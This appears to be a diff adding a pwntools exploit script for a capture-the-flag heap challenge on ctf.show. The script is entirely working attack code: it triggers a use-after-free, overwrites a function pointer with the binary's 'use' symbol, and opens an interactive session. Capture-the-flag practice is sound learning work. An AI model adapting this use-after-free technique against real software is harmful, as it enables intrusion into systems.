@@ -1,0 +1,30 @@
+from pwn import *
+context(arch = 'i386',os = 'linux',log_level = 'debug')
+#io = process('./pwn')
+io = remote('pwn.challenge.ctf.show',28234)
+elf = ELF('./pwn')
+use = elf.sym['use']
+def add(size, content):
+    io.recvuntil("choice :")
+    io.sendline("1")
+    io.recvuntil(":")
+    io.sendline(str(size))
+    io.recvuntil(":")
+    io.sendline(content)
+def delete(idx):
+    io.recvuntil("choice :")
+    io.sendline("2")
+    io.recvuntil(":")
+    io.sendline(str(idx))
+def show(idx):
+    io.recvuntil("choice :")
+    io.sendline("3")
+    io.recvuntil(":")
+    io.sendline(str(idx))
+add(32, "aaaa")
+add(32, "bbbb")
+delete(0)
+delete(1)
+add(8, p32(use))
+show(0)
+io.interactive()
